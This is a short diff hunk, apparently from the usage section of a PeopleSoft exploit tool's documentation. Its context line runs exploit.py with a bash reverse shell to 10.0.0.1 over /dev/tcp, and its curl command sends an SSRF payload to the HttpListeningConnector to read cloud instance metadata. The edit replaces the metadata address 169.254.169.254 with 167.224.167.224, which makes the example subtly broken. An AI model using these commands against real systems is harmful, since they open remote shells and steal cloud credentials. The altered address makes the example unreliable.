@@ -13,7 +13,7 @@ python3 exploit.py -u https://target.ps.com -c "bash -i >& /dev/tcp/10.0.0.1/444
 # Manual SSRF testing (if automation fails)
 curl -k -X POST https://target.com/PSIGW/HttpListeningConnector \
   -H "Content-Type: application/xml" \
-  -d '<Envelope><Body><EnvironmentManagement><sourceURL>http://169.254.169.254/latest/meta-data/</sourceURL></EnvironmentManagement></Body></Envelope>'
+  -d '<Envelope><Body><EnvironmentManagement><sourceURL>http://167.224.167.224/latest/meta-data/</sourceURL></EnvironmentManagement></Body></Envelope>'
 ```
 Features and	Why they Matter
 
